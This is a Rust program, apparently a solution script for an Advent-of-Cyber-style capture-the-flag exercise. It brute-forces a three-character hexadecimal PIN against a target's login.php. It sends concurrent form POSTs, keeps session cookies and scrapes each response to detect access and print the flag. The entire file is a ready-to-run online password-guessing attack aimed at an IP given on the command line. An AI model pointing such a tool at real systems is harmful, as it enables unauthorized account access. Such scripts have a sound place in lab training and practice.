use std::collections::HashMap;

use futures::{stream, StreamExt};
use itertools::Itertools;
use reqwest::{Client, Error, Response};
use soup::prelude::*;

extern crate argparse;

use argparse::{ArgumentParser, Store};

const CONCURRENT_REQUESTS: usize = 5;

struct BruteResult {
    combination: String,
    success: bool,
}

fn get_combinations(n: i32) -> Vec<String> {
    let characters: Vec<String> = "0123456789ABCDEF".chars().map(|x| x.into()).collect();
    (2..n).fold(
        characters
            .iter()
            .cartesian_product(characters.iter())
            .map(|(a, b)| a.to_owned() + &*b.to_owned())
            .collect(),
        |acc, _| {
            acc.into_iter()
                .cartesian_product(characters.iter())
                .map(|(a, b)| a.to_owned() + &*b.to_owned())
                .collect()
        },
    )
}

fn find_flag(
    combination: &String,
    response_text: &String,
    soup: &Soup,
) -> Result<BruteResult, Error> {
    match soup.tag("span").find() {
        Some(span_tag) => {
            println!("Flag found {}", span_tag.text());
            Ok::<BruteResult, Error>(BruteResult {
                combination: combination.clone(),
                success: true,
            })
        }
        None => {
            println!("Flag span not found in response: {}", response_text);
            Ok::<BruteResult, Error>(BruteResult {
                combination: combination.clone(),
                success: true,
            })
        }
    }
}

fn determine_result(combination: &String, response_text: &String) -> Result<BruteResult, Error> {
    let soup = Soup::new(&response_text);
    match soup.tag("h1").find() {
        Some(_) => Ok::<BruteResult, Error>(BruteResult {
            combination: combination.clone(),
            success: false,
        }),
        None => find_flag(combination, response_text, &soup),
    }
}

async fn brute_force(
    client: &Client,
    combinations: &Vec<String>,
    ip: &String,
) -> Result<Option<String>, Error> {
    let mut brute_results = stream::iter(combinations)
        .map(|combination: &String| {
            let client: &Client = &client;
            let url: String = format!("http://{ip}:8000/login.php", ip = ip);
            async move {
                let mut params: HashMap<&str, &str> = HashMap::new();
                params.insert("pin", &*combination);
                let resp: Response = client.post(&*url).form(&params).send().await?;
                let response_text = resp.text().await?;
                determine_result(combination, &response_text)
            }
        })
        .buffer_unordered(CONCURRENT_REQUESTS);

    let mut final_combination: Option<String> = None;

    loop {
        match brute_results.next().await {
            Some(Ok(result)) => {
                if result.success {
                    println!("ACCESS GRANTED: {}", result.combination);
                    final_combination = Some(result.combination);
                    break;
                } else {
                    println!("ACCESS DENIED: {}", result.combination);
                }
            }
            Some(Err(err)) => {
                println!("Error encountered: {:?}", err);
            }
            None => {
                println!("End of combinations.");
                break;
            }
        }
    }

    Ok(final_combination)
}

#[tokio::main]
async fn main() -> Result<(), reqwest::Error> {
    let mut ip: String = "10.0.0.1".to_string();

    {
        let mut ap: ArgumentParser<'_> = ArgumentParser::new();
        ap.set_description("Rusty AoC 2023 Day 3: PIN Code Bruteforce");
        ap.refer(&mut ip)
            .add_argument("ip", Store, "The IP Address to attack")
            .required();
        ap.parse_args_or_exit();
    }

    let combinations: Vec<_> = get_combinations(3);
    // println!("{:?}", combinations);

    let client: Client = Client::builder().cookie_store(true).build().unwrap();

    let url: String = format!("http://{ip}:8000/pin.php", ip = ip);

    client.get(&*url).send().await?;

    // println!("{:?}", client.get(&*url).send().await?.cookies().next());

    brute_force(&client, &combinations, &ip).await.unwrap();

    Ok(())
}
